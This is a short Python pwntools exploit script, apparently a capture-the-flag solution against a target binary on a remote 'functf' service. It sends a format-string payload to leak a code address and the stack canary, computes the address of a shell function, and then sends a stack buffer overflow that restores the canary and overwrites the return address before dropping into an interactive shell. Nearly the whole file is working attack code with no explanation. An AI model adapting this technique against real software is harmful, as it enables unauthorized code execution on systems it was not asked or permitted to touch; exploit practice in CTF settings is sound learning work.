from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
    buf=p.recvuntil("1...\n")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18007)

print "exp : start_fms"

buf=p.recvuntil("phase1:leak\n")
print hexdump(buf)

off_shell = 0xA26
off_main_71 = 0xAF8
payload=""
payload+="%9$p|"
payload+="%31$p"

p.sendline(payload)
        
buf=p.recvline()    
print hexdump(buf)    
arr_leak = buf[:-1].split('|')    
main_71 = int(arr_leak[0],16)    
cookie = int(arr_leak[1],16)    
shell_addr = main_71-off_main_71+off_shell    
print 'main_71:',hex(main_71)    
print 'cookie:',hex(cookie)    
print 'shell_addr:',hex(shell_addr)    

payload=""
payload+="A"*0x48
payload+=p64(cookie)
payload+="B"*8
payload+=p64(shell_addr)
        
p.sendline(payload)
#p.sendline("id;ls -al")

p.interactive()
